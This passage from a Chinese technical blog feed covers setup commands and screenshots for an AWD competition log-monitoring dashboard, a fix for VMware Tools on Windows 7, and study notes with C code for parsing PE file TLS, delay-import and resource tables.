<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">chmod</span> +x tapeworm.phar</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">chmod</span> +x roundworm</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> +x guardian.phar</pre></td></tr><tr><td data-num="4"></td><td><pre>./tapeworm.phar -d 目录 -s ip:port</pre></td></tr><tr><td data-num="5"></td><td><pre>./roundworm  -w 目录 -s <span class="token function">ip</span> -p port</pre></td></tr><tr><td data-num="6"></td><td><pre>./guardian.phar -i 目录 -s ip:port</pre></td></tr></table></figure><h2 id="系统截图"><a class="anchor" href="#系统截图">#</a> 系统截图</h2>
<h3 id="登陆界面"><a class="anchor" href="#登陆界面">#</a> 登陆界面</h3>
<p><span class="exturl" data-url="aHR0cDovL0lQOjEzMzcv">http://IP:1337/</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116001844261.png" alt="image-20220116001844261" /></p>
<h3 id="仪表盘"><a class="anchor" href="#仪表盘">#</a> 仪表盘</h3>
<p>在登陆页面输入生成的 token 进入仪表盘</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116002420721.png" alt="image-20220116002420721" /></p>
<h3 id="web日志列表"><a class="anchor" href="#web日志列表">#</a> Web 日志列表</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003154144.png" alt="image-20220116003154144" /></p>
<h3 id="pwn日志列表"><a class="anchor" href="#pwn日志列表">#</a> PWN 日志列表</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003317184.png" alt="image-20220116003317184" /> 文件系统日志列表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003436721.png" alt="image-20220116003436721" /></p>
<h3 id="系统进程列表"><a class="anchor" href="#系统进程列表">#</a> 系统进程列表</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003501956.png" alt="image-20220116003501956" /></p>
<h3 id="告警日志列表"><a class="anchor" href="#告警日志列表">#</a> 告警日志列表</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220116003532134.png" alt="image-20220116003532134" /></p>
]]></content>
      <categories>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>VM16 虚拟机Win7无法安装VM tools解决方法</title>
    <url>/article/6503e9cb.html</url>
    <content><![CDATA[<p><code>VMware Workstation 16</code>  虚拟机  <code>Windows 7</code>  可能无法安装  <code>VMware tools</code>  的两个症状：一是「安装  <code>Vmware Toos(T)</code> ...」菜单灰色；二是安装过程中会提示「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误而安装失败。</p>
<h2 id="vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法"><a class="anchor" href="#vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法">#</a> VM Workstation 16 虚拟机「安装 Vmware Toos (T)...」菜单灰色 解决办法</h2>
<h3 id="11手动加载-vmware-toos-光盘"><a class="anchor" href="#11手动加载-vmware-toos-光盘">#</a> 1.1 手动加载 Vmware Toos 光盘</h3>
<p>启动虚拟系统后，在  <code>VMware Workstation</code>  菜单栏「虚拟机」-「设置」「-CD-ROM」-「使用 ISO 镜像」-「浏览」，定位到物理机  <code>VMware Workstation</code>  安装目录中  <code>windows.iso</code>  文件，然后进入虚拟  <code>Win7</code>  系统，打开「我的电脑」-「光驱」- 找到「 <code>setup.exe</code> 」文件执行安装即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205185613146.png" alt="image-20211205185613146" /></p>
<h3 id="12修改软盘为自动检测"><a class="anchor" href="#12修改软盘为自动检测">#</a> 1.2 修改软盘为自动检测</h3>
<p>在开启虚拟机操作系统情况下，虚拟机设置中更改  <code>Floppy</code> （软盘）为  <code>Auto detect</code> （自动检测），保存可能会提示出错，不用理会。如无意外，「安装  <code>Vmware Toos(T)</code> ...」已经可以点击，加载成功，虚拟操作系统中光驱里就会有  <code>VMWare Tools</code>  安装程序，打开安装即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190123458.png" alt="image-20211205190123458" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205185737907.png" alt="image-20211205185737907" /></p>
<p>重新进入虚拟机即可发现安装 <code>VM tools</code>  按钮可用了。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190428357.png" alt="image-20211205190428357" /></p>
<h2 id="vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败"><a class="anchor" href="#vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败">#</a> VM Workstation 16 虚拟机 Win 7 安装 VMware tools 失败</h2>
<p>如无意外，安装  <code>VMware Tools</code>  过程中，会弹出「 <code>Windows</code>  无法验证此驱动程序软件的发布者」，点击「始终安装」继续强制安装，最终会弹出「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误提示，最终导致安装失败。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190248651.png" alt="image-20211205190248651" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190316611.png" alt="image-20211205190316611" /></p>
<p>解决方法：由于微软更新了驱动程序签名算法，2019 年开始弃用  <code>SHA1</code> ，改用 <code>SHA2</code> 。</p>
<p><code> VMware Tools</code>  驱动程序使用  <code>SHA2</code> ，而  <code>Windows7</code>  只支持 <code>SHA1</code> ，需要下载安装补丁  <code>KB4474419</code>  来支持  <code>SHA2</code>  算法。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2F0YWxvZy51cGRhdGUubWljcm9zb2Z0LmNvbS9TZWFyY2guYXNweD9xPWtiNDQ3NDQxOQ==">下载地址</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205193001934.png" alt="image-20211205193001934" /><br />
 安装 <code>KB4474419</code>  补丁完成，再安装  <code>VMware tools</code>  就可以顺利安装上。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210121019804.png" alt="image-20211210121019804" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210121032770.png" alt="image-20211210121032770" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jeWhvdXIuY29tLzE2NDUv">参考链接</span></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之TLS表、延迟导入表、资源表和其他表解析</title>
    <url>/article/735341d2.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301185234414.png" alt="image-20220301185234414" /></p>
<h1 id="tls表结构解析"><a class="anchor" href="#tls表结构解析">#</a> TLS 表结构解析</h1>
<p>lord PE 中查看 TLS 表信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228194119186.png" alt="image-20220228194119186" /></p>
<p>由于 TLS 表往往存在 TLS 区段中的局部存储当中，而局部存储一般情况下会优于程序执行之前运行也就在执行 main 函数之前，所以需要考虑前后顺序。</p>
<h3 id="tls结构顺序"><a class="anchor" href="#tls结构顺序">#</a> TLS 结构顺序</h3>
<p>32 位 TLS 表结构： <code>_IMAGE_TLS_DIRECTORY32</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228195012078.png" alt="image-20220228195012078" /></p>
<h3 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码：</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析 TLS 表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">TLSTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">TLSTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的 TLS 表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pTLSDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_TLS<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充 TLS 结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_TLS_DIRECTORY pTLS <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_TLS_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pTLSDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"数据块开始VA：%08X\n"</span><span class="token punctuation">,</span>pTLS<span class="token operator">-></span>StartAddressOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"数据块结束VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>EndAddressOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"索引变量VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>AddressOfIndex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"回调表VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>AddressOfCallBacks<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"填零大小：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>SizeOfZeroFill<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"特征值：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228200233832.png" alt="image-20220228200233832" /></p>
<h3 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301131404424.png" alt="image-20220301131404424" /></p>
<h1 id="延迟导入表结构解析"><a class="anchor" href="#延迟导入表结构解析">#</a> 延迟导入表结构解析</h1>
<p>延迟导入表结构：  <code>_IMAGE_DELAYLOAD_DESCRIPTOR</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DELAYLOAD_DESCRIPTOR</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD AllAttributes<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            DWORD RvaBased <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>             <span class="token comment">// Delay load version 2</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            DWORD ReservedAttributes <span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span> Attributes<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    DWORD DllNameRVA<span class="token punctuation">;</span>                       <span class="token comment">// RVA to the name of the target library (NULL-terminate ASCII string)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD ModuleHandleRVA<span class="token punctuation">;</span>                  <span class="token comment">// RVA to the HMODULE caching location (PHMODULE)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD ImportAddressTableRVA<span class="token punctuation">;</span>            <span class="token comment">// RVA to the start of the IAT (PIMAGE_THUNK_DATA)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DWORD ImportNameTableRVA<span class="token punctuation">;</span>               <span class="token comment">// RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    DWORD BoundImportAddressTableRVA<span class="token punctuation">;</span>       <span class="token comment">// RVA to an optional bound IAT</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    DWORD UnloadInformationTableRVA<span class="token punctuation">;</span>        <span class="token comment">// RVA to an optional unload info table</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    DWORD TimeDateStamp<span class="token punctuation">;</span>                    <span class="token comment">// 0 if not bound,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                                            <span class="token comment">// Otherwise, date/time of the target DLL</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301133930829.png" alt="image-20220301133930829" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码：</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析延迟导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">DelayImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">DelayImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的延迟导入表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pDelayLoadDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充延迟导入表的数据结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pDelayLoadDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token comment">//</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pDelayLoad<span class="token operator">-></span>DllNameRVA <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pDelayLoad<span class="token operator">-></span>DllNameRVA<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLLName：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Attributes：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>Attributes<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ModuleHandleRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ModuleHandleRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImportAddressTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ImportAddressTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImportNameTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ImportNameTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"BoundImportAddressTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>BoundImportAddressTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UnloadInformationTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>UnloadInformationTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"TimeDateStamp：%08X\n\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		pDelayLoad<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行测试"><a class="anchor" href="#运行测试">#</a> 运行测试：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301143542531.png" alt="image-20220301143542531" /></p>
<h1 id="资源表结构解析"><a class="anchor" href="#资源表结构解析">#</a> 资源表结构解析</h1>
<p>Lord PE 中查看资源表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301152700474.png" alt="image-20220301152700474" /></p>
<p>资源在 PE 中是以目录的形式存在的，一般有 3 层：</p>
<ul>
<li>资源类型</li>
<li>目标资源 ID</li>
<li>资源代码页</li>
</ul>
<p>资源表头部结构： <code>PIMAGE_RESOURCE_DIRECTORY</code>  负责指出后面数组中的成员个数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   Characteristics<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    WORD    MajorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    WORD    MinorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    WORD    NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    WORD    NumberOfIdEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_RESOURCE_NAME_IS_STRING</span>        <span class="token expression"><span class="token number">0x80000000</span></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_RESOURCE_DATA_IS_DIRECTORY</span>     <span class="token expression"><span class="token number">0x80000000</span></span></span></pre></td></tr></table></figure><ul>
<li>Characteristics：资源属性，一般情况下为 <code>00000000</code></li>
<li>TimeDateStamp：资源创建的时间</li>
<li>MajorVersion：主版本号，一般情况下为 4</li>
<li>MinorVersion：子版本号，一般情况下为 0</li>
<li>NumberOfNamedEntries：以字符串作为资源标识的条目的个数</li>
<li>NumberOfIdEntries：以数字作为资源标识的条目的个数</li>
</ul>
<p>结构数组： <code>PIMAGE_RESOURCE_DIRECTORY_ENTRY</code>  数组成员分别指向下一层目录结构</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIRECTORY_ENTRY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            DWORD NameOffset<span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token comment">// 资源名偏移</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            DWORD NameIsString<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 资源名为字符串</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        DWORD   Name<span class="token punctuation">;</span><span class="token comment">// 资源 / 语言类型</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        WORD    Id<span class="token punctuation">;</span><span class="token comment">// 资源数字 ID</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        DWORD   OffsetToData<span class="token punctuation">;</span><span class="token comment">// 数据偏移地址</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            DWORD   OffsetToDirectory<span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token comment">// 子目录偏移地址</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            DWORD   DataIsDirectory<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 数据为目录</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">;</span></pre></td></tr></table></figure><p><code>PIMAGE_RESOURCE_DIR_STRING_U</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIR_STRING_U</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    WORD    Length<span class="token punctuation">;</span><span class="token comment">// 字符串长度</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    WCHAR   NameString<span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 字符串数组</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">;</span></pre></td></tr></table></figure><p>资源数据： <code>PIMAGE_RESOURCE_DATA_ENTRY</code></p>
